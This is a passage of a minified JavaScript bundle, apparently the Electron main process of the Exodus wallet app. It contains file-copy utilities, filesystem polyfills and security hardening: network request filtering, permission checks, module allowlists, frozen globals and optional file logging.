                `Cannot copy '${s}' to a subdirectory of itself, '${e}'.`
              );
            if (r.statSync(n).isDirectory() && c.isSrcSubdir(e, s))
              throw new Error(`Cannot overwrite '${e}' with '${s}'.`);
            return (function (e, t) {
              return r.unlinkSync(t), r.symlinkSync(e, t);
            })(s, n);
          }
          return r.symlinkSync(s, n);
        })(e, t, n, i);
      if (s.isSocket()) throw new Error(`Cannot copy a socket file: ${t}`);
      if (s.isFIFO()) throw new Error(`Cannot copy a FIFO pipe: ${t}`);
      throw new Error(`Unknown file: ${t}`);
    }
    function u(e, t, n, o) {
      return (
        r.copyFileSync(t, n),
        o.preserveTimestamps &&
          (function (e, t, n) {
            (function (e) {
              return 0 == (128 & e);
            })(e) &&
              (function (e, t) {
                l(e, 128 | t);
              })(n, e);
            (function (e, t) {
              const n = r.statSync(e);
              s(t, n.atime, n.mtime);
            })(t, n);
          })(e.mode, t, n),
        l(n, e.mode)
      );
    }
    function l(e, t) {
      return r.chmodSync(e, t);
    }
    function f(e, t, n) {
      r.readdirSync(e).forEach((r) =>
        (function (e, t, n, r) {
          const i = o.join(t, e),
            s = o.join(n, e),
            { destStat: u } = c.checkPathsSync(i, s, "copy", r);
          return (function (e, t, n, r) {
            if (!r.filter || r.filter(t, n)) return a(e, t, n, r);
          })(u, i, s, r);
        })(r, e, t, n)
      );
    }
    e.exports = function (e, t, n) {
      "function" == typeof n && (n = { filter: n }),
        ((n = n || {}).clobber = !("clobber" in n && !n.clobber)),
        (n.overwrite = "overwrite" in n ? !!n.overwrite : n.clobber),
        n.preserveTimestamps &&
          "ia32" === process.arch &&
          process.emitWarning(
            "Using the preserveTimestamps option in 32-bit node is not recommended;\n\n\tsee https://github.com/jprichardson/node-fs-extra/issues/269",
            "Warning",
            "fs-extra-WARN0002"
          );
      const { srcStat: s, destStat: u } = c.checkPathsSync(e, t, "copy", n);
      return (
        c.checkParentPathsSync(e, s, t, "copy"),
        (function (e, t, n, s) {
          if (s.filter && !s.filter(t, n)) return;
          const c = o.dirname(n);
          return r.existsSync(c) || i(c), a(e, t, n, s);
        })(u, e, t, n)
      );
    };
  },
  function (e, t, n) {
    "use strict";
    const r = n(1);
    e.exports.checkPath = function (e) {
      if ("win32" === process.platform) {
        if (/[<>:"|?*]/.test(e.replace(r.parse(e).root, ""))) {
          const t = new Error(`Path contains invalid characters: ${e}`);
          throw ((t.code = "EINVAL"), t);
        }
      }
    };
  },
  function (e, t, n) {
    "use strict";
    const r = n(47),
      { checkPath: o } = n(205),
      i = (e) => {
        return "number" == typeof e ? e : { ...{ mode: 511 }, ...e }.mode;
      };
    (e.exports.makeDir = async (e, t) => (
      o(e), r.mkdir(e, { mode: i(t), recursive: !0 })
    )),
      (e.exports.makeDirSync = (e, t) => (
        o(e), r.mkdirSync(e, { mode: i(t), recursive: !0 })
      ));
  },
  function (e, t, n) {
    "use strict";
    const r = n(7),
      o = n(1),
      i = n(23).mkdirs,
      s = n(39).pathExists,
      c = n(93).utimesMillis,
      a = n(46);
    function u(e, t, n, r, c) {
      const a = o.dirname(n);
      s(a, (o, s) =>
        o
          ? c(o)
          : s
          ? f(e, t, n, r, c)
          : void i(a, (o) => (o ? c(o) : f(e, t, n, r, c)))
      );
    }
    function l(e, t, n, r, o, i) {
      Promise.resolve(o.filter(n, r)).then(
        (s) => (s ? e(t, n, r, o, i) : i()),
        (e) => i(e)
      );
    }
    function f(e, t, n, o, i) {
      (o.dereference ? r.stat : r.lstat)(t, (s, c) =>
        s
          ? i(s)
          : c.isDirectory()
          ? (function (e, t, n, o, i, s) {
              return t
                ? m(n, o, i, s)
                : (function (e, t, n, o, i) {
                    r.mkdir(n, (r) => {
                      if (r) return i(r);
                      m(t, n, o, (t) => (t ? i(t) : h(n, e, i)));
                    });
                  })(e.mode, n, o, i, s);
            })(c, e, t, n, o, i)
          : c.isFile() || c.isCharacterDevice() || c.isBlockDevice()
          ? (function (e, t, n, o, i, s) {
              return t
                ? (function (e, t, n, o, i) {
                    if (!o.overwrite)
                      return o.errorOnExist
                        ? i(new Error(`'${n}' already exists`))
                        : i();
                    r.unlink(n, (r) => (r ? i(r) : d(e, t, n, o, i)));
                  })(e, n, o, i, s)
                : d(e, n, o, i, s);
            })(c, e, t, n, o, i)
          : c.isSymbolicLink()
          ? w(e, t, n, o, i)
          : c.isSocket()
          ? i(new Error(`Cannot copy a socket file: ${t}`))
          : c.isFIFO()
          ? i(new Error(`Cannot copy a FIFO pipe: ${t}`))
          : i(new Error(`Unknown file: ${t}`))
      );
    }
    function d(e, t, n, o, i) {
      r.copyFile(t, n, (r) =>
        r
          ? i(r)
          : o.preserveTimestamps
          ? (function (e, t, n, r) {
              if (
                (function (e) {
                  return 0 == (128 & e);
                })(e)
              )
                return (function (e, t, n) {
                  return h(e, 128 | t, n);
                })(n, e, (o) => (o ? r(o) : p(e, t, n, r)));
              return p(e, t, n, r);
            })(e.mode, t, n, i)
          : h(n, e.mode, i)
      );
    }
    function p(e, t, n, o) {
      !(function (e, t, n) {
        r.stat(e, (e, r) => (e ? n(e) : c(t, r.atime, r.mtime, n)));
      })(t, n, (t) => (t ? o(t) : h(n, e, o)));
    }
    function h(e, t, n) {
      return r.chmod(e, t, n);
    }
    function m(e, t, n, o) {
      r.readdir(e, (r, i) => (r ? o(r) : y(i, e, t, n, o)));
    }
    function y(e, t, n, r, i) {
      const s = e.pop();
      return s
        ? (function (e, t, n, r, i, s) {
            const c = o.join(n, t),
              u = o.join(r, t);
            a.checkPaths(c, u, "copy", i, (t, o) => {
              if (t) return s(t);
              const { destStat: a } = o;
              !(function (e, t, n, r, o) {
                r.filter ? l(f, e, t, n, r, o) : f(e, t, n, r, o);
              })(a, c, u, i, (t) => (t ? s(t) : y(e, n, r, i, s)));
            });
          })(e, s, t, n, r, i)
        : i();
    }
    function w(e, t, n, i, s) {
      r.readlink(t, (t, c) =>
        t
          ? s(t)
          : (i.dereference && (c = o.resolve(process.cwd(), c)),
            e
              ? void r.readlink(n, (t, u) =>
                  t
                    ? "EINVAL" === t.code || "UNKNOWN" === t.code
                      ? r.symlink(c, n, s)
                      : s(t)
                    : (i.dereference && (u = o.resolve(process.cwd(), u)),
                      a.isSrcSubdir(c, u)
                        ? s(
                            new Error(
                              `Cannot copy '${c}' to a subdirectory of itself, '${u}'.`
                            )
                          )
                        : e.isDirectory() && a.isSrcSubdir(u, c)
                        ? s(new Error(`Cannot overwrite '${u}' with '${c}'.`))
                        : (function (e, t, n) {
                            r.unlink(t, (o) => (o ? n(o) : r.symlink(e, t, n)));
                          })(c, n, s))
                )
              : r.symlink(c, n, s))
      );
    }
    e.exports = function (e, t, n, r) {
      "function" != typeof n || r
        ? "function" == typeof n && (n = { filter: n })
        : ((r = n), (n = {})),
        (r = r || function () {}),
        ((n = n || {}).clobber = !("clobber" in n && !n.clobber)),
        (n.overwrite = "overwrite" in n ? !!n.overwrite : n.clobber),
        n.preserveTimestamps &&
          "ia32" === process.arch &&
          process.emitWarning(
            "Using the preserveTimestamps option in 32-bit node is not recommended;\n\n\tsee https://github.com/jprichardson/node-fs-extra/issues/269",
            "Warning",
            "fs-extra-WARN0001"
          ),
        a.checkPaths(e, t, "copy", n, (o, i) => {
          if (o) return r(o);
          const { srcStat: s, destStat: c } = i;
          a.checkParentPaths(e, s, t, "copy", (o) =>
            o ? r(o) : n.filter ? l(u, c, e, t, n, r) : u(c, e, t, n, r)
          );
        });
    };
  },
  function (e, t, n) {
    "use strict";
    e.exports = function (e) {
      if (null === e || "object" != typeof e) return e;
      if (e instanceof Object) var t = { __proto__: r(e) };
      else var t = Object.create(null);
      return (
        Object.getOwnPropertyNames(e).forEach(function (n) {
          Object.defineProperty(t, n, Object.getOwnPropertyDescriptor(e, n));
        }),
        t
      );
    };
    var r =
      Object.getPrototypeOf ||
      function (e) {
        return e.__proto__;
      };
  },
  function (e, t, n) {
    var r = n(56).Stream;
    e.exports = function (e) {
      return {
        ReadStream: function t(n, o) {
          if (!(this instanceof t)) return new t(n, o);
          r.call(this);
          var i = this;
          this.path = n;
          this.fd = null;
          this.readable = !0;
          this.paused = !1;
          this.flags = "r";
          this.mode = 438;
          this.bufferSize = 65536;
          o = o || {};
          var s = Object.keys(o);
          for (var c = 0, a = s.length; c < a; c++) {
            var u = s[c];
            this[u] = o[u];
          }
          this.encoding && this.setEncoding(this.encoding);
          if (void 0 !== this.start) {
            if ("number" != typeof this.start)
              throw TypeError("start must be a Number");
            if (void 0 === this.end) this.end = 1 / 0;
            else if ("number" != typeof this.end)
              throw TypeError("end must be a Number");
            if (this.start > this.end) throw new Error("start must be <= end");
            this.pos = this.start;
          }
          if (null !== this.fd)
            return void process.nextTick(function () {
              i._read();
            });
          e.open(this.path, this.flags, this.mode, function (e, t) {
            if (e) return i.emit("error", e), void (i.readable = !1);
            (i.fd = t), i.emit("open", t), i._read();
          });
        },
        WriteStream: function t(n, o) {
          if (!(this instanceof t)) return new t(n, o);
          r.call(this);
          this.path = n;
          this.fd = null;
          this.writable = !0;
          this.flags = "w";
          this.encoding = "binary";
          this.mode = 438;
          this.bytesWritten = 0;
          o = o || {};
          var i = Object.keys(o);
          for (var s = 0, c = i.length; s < c; s++) {
            var a = i[s];
            this[a] = o[a];
          }
          if (void 0 !== this.start) {
            if ("number" != typeof this.start)
              throw TypeError("start must be a Number");
            if (this.start < 0) throw new Error("start must be >= zero");
            this.pos = this.start;
          }
          this.busy = !1;
          this._queue = [];
          null === this.fd &&
            ((this._open = e.open),
            this._queue.push([
              this._open,
              this.path,
              this.flags,
              this.mode,
              void 0,
            ]),
            this.flush());
        },
      };
    };
  },
  function (e, t) {
    e.exports = require("constants");
  },
  function (e, t, n) {
    var r = n(210),
      o = process.cwd,
      i = null,
      s = process.platform;
    process.cwd = function () {
      return i || (i = o.call(process)), i;
    };
    try {
      process.cwd();
    } catch (e) {}
    if ("function" == typeof process.chdir) {
      var c = process.chdir;
      (process.chdir = function (e) {
        (i = null), c.call(process, e);
      }),
        Object.setPrototypeOf && Object.setPrototypeOf(process.chdir, c);
    }
    e.exports = function (e) {
      r.hasOwnProperty("O_SYMLINK") &&
        process.version.match(/^v0\.6\.[0-2]|^v0\.5\./) &&
        (function (e) {
          (e.lchmod = function (t, n, o) {
            e.open(t, r.O_WRONLY | r.O_SYMLINK, n, function (t, r) {
              t
                ? o && o(t)
                : e.fchmod(r, n, function (t) {
                    e.close(r, function (e) {
                      o && o(t || e);
                    });
                  });
            });
          }),
            (e.lchmodSync = function (t, n) {
              var o,
                i = e.openSync(t, r.O_WRONLY | r.O_SYMLINK, n),
                s = !0;
              try {
                (o = e.fchmodSync(i, n)), (s = !1);
              } finally {
                if (s)
                  try {
                    e.closeSync(i);
                  } catch (e) {}
                else e.closeSync(i);
              }
              return o;
            });
        })(e);
      e.lutimes ||
        (function (e) {
          r.hasOwnProperty("O_SYMLINK") && e.futimes
            ? ((e.lutimes = function (t, n, o, i) {
                e.open(t, r.O_SYMLINK, function (t, r) {
                  t
                    ? i && i(t)
                    : e.futimes(r, n, o, function (t) {
                        e.close(r, function (e) {
                          i && i(t || e);
                        });
                      });
                });
              }),
              (e.lutimesSync = function (t, n, o) {
                var i,
                  s = e.openSync(t, r.O_SYMLINK),
                  c = !0;
                try {
                  (i = e.futimesSync(s, n, o)), (c = !1);
                } finally {
                  if (c)
                    try {
                      e.closeSync(s);
                    } catch (e) {}
                  else e.closeSync(s);
                }
                return i;
              }))
            : e.futimes &&
              ((e.lutimes = function (e, t, n, r) {
                r && process.nextTick(r);
              }),
              (e.lutimesSync = function () {}));
        })(e);
      (e.chown = o(e.chown)),
        (e.fchown = o(e.fchown)),
        (e.lchown = o(e.lchown)),
        (e.chmod = t(e.chmod)),
        (e.fchmod = t(e.fchmod)),
        (e.lchmod = t(e.lchmod)),
        (e.chownSync = i(e.chownSync)),
        (e.fchownSync = i(e.fchownSync)),
        (e.lchownSync = i(e.lchownSync)),
        (e.chmodSync = n(e.chmodSync)),
        (e.fchmodSync = n(e.fchmodSync)),
        (e.lchmodSync = n(e.lchmodSync)),
        (e.stat = c(e.stat)),
        (e.fstat = c(e.fstat)),
        (e.lstat = c(e.lstat)),
        (e.statSync = a(e.statSync)),
        (e.fstatSync = a(e.fstatSync)),
        (e.lstatSync = a(e.lstatSync)),
        e.chmod &&
          !e.lchmod &&
          ((e.lchmod = function (e, t, n) {
            n && process.nextTick(n);
          }),
          (e.lchmodSync = function () {}));
      e.chown &&
        !e.lchown &&
        ((e.lchown = function (e, t, n, r) {
          r && process.nextTick(r);
        }),
        (e.lchownSync = function () {}));
      "win32" === s &&
        (e.rename =
          "function" != typeof e.rename
            ? e.rename
            : (function (t) {
                function n(n, r, o) {
                  var i = Date.now(),
                    s = 0;
                  t(n, r, function c(a) {
                    if (
                      a &&
                      ("EACCES" === a.code || "EPERM" === a.code) &&
                      Date.now() - i < 6e4
                    )
                      return (
                        setTimeout(function () {
                          e.stat(r, function (e, i) {
                            e && "ENOENT" === e.code ? t(n, r, c) : o(a);
                          });
                        }, s),
                        void (s < 100 && (s += 10))
                      );
                    o && o(a);
                  });
                }
                return Object.setPrototypeOf && Object.setPrototypeOf(n, t), n;
              })(e.rename));
      function t(t) {
        return t
          ? function (n, r, o) {
              return t.call(e, n, r, function (e) {
                u(e) && (e = null), o && o.apply(this, arguments);
              });
            }
          : t;
      }
      function n(t) {
        return t
          ? function (n, r) {
              try {
                return t.call(e, n, r);
              } catch (e) {
                if (!u(e)) throw e;
              }
            }
          : t;
      }
      function o(t) {
        return t
          ? function (n, r, o, i) {
              return t.call(e, n, r, o, function (e) {
                u(e) && (e = null), i && i.apply(this, arguments);
              });
            }
          : t;
      }
      function i(t) {
        return t
          ? function (n, r, o) {
              try {
                return t.call(e, n, r, o);
              } catch (e) {
                if (!u(e)) throw e;
              }
            }
          : t;
      }
      function c(t) {
        return t
          ? function (n, r, o) {
              function i(e, t) {
                t &&
                  (t.uid < 0 && (t.uid += 4294967296),
                  t.gid < 0 && (t.gid += 4294967296)),
                  o && o.apply(this, arguments);
              }
              return (
                "function" == typeof r && ((o = r), (r = null)),
                r ? t.call(e, n, r, i) : t.call(e, n, i)
              );
            }
          : t;
      }
      function a(t) {
        return t
          ? function (n, r) {
              var o = r ? t.call(e, n, r) : t.call(e, n);
              return (
                o &&
                  (o.uid < 0 && (o.uid += 4294967296),
                  o.gid < 0 && (o.gid += 4294967296)),
                o
              );
            }
          : t;
      }
      function u(e) {
        if (!e) return !0;
        if ("ENOSYS" === e.code) return !0;
        var t = !process.getuid || 0 !== process.getuid();
        return !(!t || ("EINVAL" !== e.code && "EPERM" !== e.code));
      }
      (e.read =
        "function" != typeof e.read
          ? e.read
          : (function (t) {
              function n(n, r, o, i, s, c) {
                var a;
                if (c && "function" == typeof c) {
                  var u = 0;
                  a = function (l, f, d) {
                    if (l && "EAGAIN" === l.code && u < 10)
                      return u++, t.call(e, n, r, o, i, s, a);
                    c.apply(this, arguments);
                  };
                }
                return t.call(e, n, r, o, i, s, a);
              }
              return Object.setPrototypeOf && Object.setPrototypeOf(n, t), n;
            })(e.read)),
        (e.readSync =
          "function" != typeof e.readSync
            ? e.readSync
            : ((l = e.readSync),
              function (t, n, r, o, i) {
                for (var s = 0; ; )
                  try {
                    return l.call(e, t, n, r, o, i);
                  } catch (e) {
                    if ("EAGAIN" === e.code && s < 10) {
                      s++;
                      continue;
                    }
                    throw e;
                  }
              }));
      var l;
    };
  },
  function (e, t, n) {
    "use strict";
    n.r(t);
    var r = n(0),
      o = n(50),
      i = n.n(o),
      s = n(1),
      c = n.n(s),
      a = n(13),
      u = n(2),
      l = n(37),
      f = n(6),
      d = n(45);
    const p = u.ENV_PROD ? "./" : "src/",
      h = c.a.join(r.app.getAppPath(), p),
      m = i()(process.argv);
    function y(e, { prefix: t, mimetypes: n }) {
      return e.getURL().startsWith(t) && n.includes(e.getMimeType());
    }
    const [w, b, g, E] = [1, 2, 3, 4];
    function v(e, t) {
      const n = Object(d.getRequestRules)(e, t);
      if (!n) return g;
      if ("block_silent" === n) return E;
      const { protocols: r, domains: o } = n,
        { protocol: i, hostname: s, pathname: u } = t,
        f = ["http:", "ws:"].includes(i),
        p = ["localhost", "127.0.0.1"].includes(s);
      if (f && !p) return g;
      const y = "file:" === i,
        b = ["exodus-dapp-api:", "exodus-nfts-api:"].includes(i),
        v = ["devtools:", "chrome-extension:"].includes(i),
        S = [
          "https:",
          "wss:",
          "file:",
          "exodus-dapp-api:",
          "exodus-nfts-api:",
        ].includes(i);
      if (
        y &&
        !(function (e) {
          const t = Object(a.fileURLToPath)(e),
            n = c.a.relative(h, t),
            r = c.a.resolve(t),
            o = Object(l.imagesDir)();
          if (n.includes("..") && !r.startsWith(o)) return !1;
          const i = [h, o];
          return m.datadir && i.push(m.datadir), i.some((e) => r.startsWith(e));
        })(t)
      )
        return u.endsWith(".map") ? E : g;
      if (v) return w;
      if ("*" !== r) {
        if (!((p && f && r.includes("localhost")) || (S && r.includes(i))))
          return g;
      }
      if ("*" !== o && !y && !b) {
        const e = (function (e) {
          return e.port
            ? parseInt(e.port, 10)
            : ["https:", "wss:"].includes(e.protocol)
            ? 443
            : ["http:", "ws:"].includes(e.protocol)
            ? 80
            : null;
        })(t);
        if (
          !(
            (443 === e && o.includes(`${s}`)) ||
            (e && o.includes(`${s}:${e}`)) ||
            o.includes(`${s}:*`)
          )
        )
          return g;
      }
      return w;
    }
    const S = new WeakSet();
    function O(e) {
      if (S.has(e)) return;
      S.add(e), e.setSSLConfig({ minVersion: "tls1.2" });
      const { webRequest: t } = e;
      t.onBeforeRequest((t, n) => {
        const r = new a.URL(t.url),
          o = v(e, r),
          i = {};
        o === w ||
          (o === b && u.ENV_EXODUS_PROD) ||
          ((i.cancel = !0),
          o !== E &&
            Object(f.showError)("network request", ` to ${r.toString()}`)),
          n(i);
      }),
        e.on("will-download", (e, t, n) => {
          try {
            if (
              (function (e, t) {
                const { downloads: n } = Object(d.getSessionRules)(t.session);
                for (const t of n)
                  if (y(e, t))
                    return (
                      !0 === t.open &&
                        e.once("done", () => {
                          r.shell.openPath(e.getSavePath());
                        }),
                      !0
                    );
                if (
                  t.getURL().startsWith("devtools://") &&
                  y(e, { prefix: "blob:devtools://", mimetypes: ["image/png"] })
                )
                  return !0;
                return !1;
              })(t, n)
            )
              return;
          } catch (e) {}
          e.preventDefault(), Object(f.showError)("download attempt");
        }),
        e.setPermissionRequestHandler((e, t, n, r) => {
          return n(_(e, t, r));
        }),
        e.setPermissionCheckHandler((e, t, n, r) => {
          return _(e, t, r);
        }),
        e.setSpellCheckerLanguages([]);
    }
    const k = ["accessibility-events", "window-placement"];
    function _(e, t, n) {
      const r = (function (e, t, n) {
        if (!e) return !1;
        if (!n.isMainFrame) return !1;
        const { permissions: r } = Object(d.getSessionRules)(e.session);
        return r.includes(t);
      })(e, t, n);
      return (
        r ||
          k.includes(t) ||
          Object(f.showError)("unexpected permission request", ` to ${t}`),
        r
      );
    }
    r.app.on("ready", () => {
      O(r.session.defaultSession);
    }),
      r.app.on("session-created", (e) => {
        O(e);
      });
  },
  function (e, t, n) {
    const { app: r } = n(0);
    if (r.isReady())
      throw new Error(
        "Electron security must be imported before the app is ready"
      );
    n(212), n(8);
  },
  function (e, t, n) {
    "use strict";
    e.exports = {
      getProcessName: function () {
        return "main";
      },
    };
  },
  function (e, t, n) {
    "use strict";
    n.r(t),
      n.d(t, "allowedBuiltins", function () {
        return r;
      });
    const r = (e) => {
      const t = ["electron", "module"];
      switch (e) {
        case "main":
          return [
            ...t,
            "child_process",
            "tty",
            "crypto",
            "assert",
            "buffer",
            "constants",
            "events",
            "fs",
            "fs/promises",
            "os",
            "path",
            "stream",
            "url",
            "util",
            "zlib",
            ...[],
          ];
        case "monero":
          return [...t, "crypto", "buffer", "util", "stream"];
        case "core":
          return [
            ...t,
            "crypto",
            "assert",
            "constants",
            "fs",
            "os",
            "path",
            "stream",
            "util",
            "zlib",
          ];
        case "wallet":
          return [
            ...t,
            "crypto",
            "assert",
            "buffer",
            "constants",
            "events",
            "fs",
            "os",
            "path",
            "querystring",
            "stream",
            "url",
            "util",
            "zlib",
          ];
        case "ui":
          return [
            ...t,
            "crypto",
            "assert",
            "buffer",
            "constants",
            "events",
            "fs",
            "http",
            "https",
            "net",
            "os",
            "path",
            "querystring",
            "stream",
            "tls",
            "url",
            "util",
            "zlib",
          ];
      }
      return [];
    };
  },
  function (e, t, n) {
    const { builtinModules: r } = n(72),
      o = Function.prototype.call.bind(Array.prototype.includes);
    e.exports = (e) =>
      !e.startsWith("events/") &&
      !e.endsWith("/") &&
      ((e) => "electron" === e || o(r, e))(e.replace(/\/.*/, ""));
  },
  function (e, t, n) {
    if (void 0 !== globalThis.Buffer && globalThis.Buffer) {
      const Buffer = globalThis.Buffer;
      (Buffer.poolSize = 0),
        (Buffer.allocUnsafe = function (e) {
          return Buffer.alloc(e);
        }),
        (Buffer.allocUnsafeSlow = Buffer.allocUnsafe),
        Object.freeze(Buffer);
    }
    const r = Object.getPrototypeOf(Int8Array);
    for (const e of [
      ...[Object, Array, Number, String, Function, Set, Map, WeakSet, WeakMap],
      ...[Reflect, TypeError, BigInt, URL, Date, JSON, Math],
      ...[Int8Array, Int16Array, Int32Array, DataView],
      ...[Uint8Array, Uint16Array, Uint32Array, r],
    ])
      Object.freeze(e);
    "undefined" != typeof crypto &&
      crypto &&
      crypto.subtle &&
      (Object.freeze(crypto), Object.freeze(crypto.subtle));
    {
      const e = n(72),
        t = () => {
          throw new Error("require() of non-builtins has been disabled");
        };
      e._findPath = t;
      for (const n of Object.keys(e._extensions)) e._extensions[n] = t;
    }
    {
      const e = n(72),
        t = n(216),
        r = Function.prototype.call.bind(Array.prototype.includes),
        o = () => {
          const { allowedBuiltins: e } = n(215),
            { getProcessName: t } = n(214),
            r = t();
          return { processName: r, allowedModules: [...e(r)] };
        },
        { processName: i, allowedModules: s } = o(),
        c = (e, n) => {
          if ((t(e), "module" !== e && r(s, e))) return;
          throw new Error(
            `Requiring module "${e}" is not allowed` +
              ` in browser process "${i}" (parent: ${n})`
          );
        },
        a = e._resolveFilename.bind(e);
      e._resolveFilename = (e, t, ...n) => (c(e, t.id), a(e, t, ...n));
    }
    process.binding &&
      (process.binding = (e) => {
        throw new Error(
          `harden: process.binding(${JSON.stringify(e)}) has been disabled`
        );
      });
  },
  function (e, t) {
    const n = (...e) => {
      const t = e
        .reduce(
          (e, t) =>
            e.concat(
              ((e) => e instanceof Error && e.stack)(t) ? t.stack : t,
              "\n"
            ),
          ""
        )
        .trim();
      console._errorOriginal(t);
    };
    console._errorOriginal ||
      ((console._errorOriginal = console.error.bind(console)),
      (console.error = n));
  },
  function (e, t, n) {
    n(218), n(217);
  },
  function (e, t, n) {
    const r = n(30),
      { format: o } = n(35),
      i = n(1),
      s = n(36);
    if (process.argv.includes("--eden-full-log-to-file")) {
      process.env.ELECTRON_ENABLE_LOGGING = 1;
      const e = i.join(s.homedir(), `exodus.${Date.now()}.log`),
        t = process.pid;
      let n = !0;
      const c = ({ ...o }) => {
        const i = JSON.stringify({
          time: new Date().toISOString(),
          pid: t,
          ...o,
        });
        r.appendFileSync(e, `${i}\n`), n && (r.chmodSync(e, 384), (n = !1));
      };
      for (const e of ["log", "warn", "error", "info", "debug"]) {
        const t = console[e].bind(console);
        console[e] = (...n) => {
          t(...n);
          const r = {
              level: "log" === e ? "info" : e,
              name: "browser",
              message: o(...n),
            },
            i = ((new Error().stack || "").split("\n")[2] || "")
              .trim()
              .match(/\((.*):([0-9]+):([0-9]+)\)$/);
          i &&
            Object.assign(r, {
              source: i[1],
              line: Number(i[2]),
              column: Number(i[3]),
            }),
            c(r);
        };
      }
      (globalThis.EDEN_LOG_TO_FILE = { log: c }),
        console.log(`Logs are forwarded to ${e}`);
    }
  },
  function (e, t, n) {
    2 === process.argv.length &&
      "--version" === process.argv[1] &&
      (console.log(n(74).version), n(0).app.exit(0)),
      console.time("main"),
      console.log("ENV: production"),
      n(22).instantEvent("didStartMain"),
      n(219),
      n(213),
      n(21),
      n(131);
  },
]);
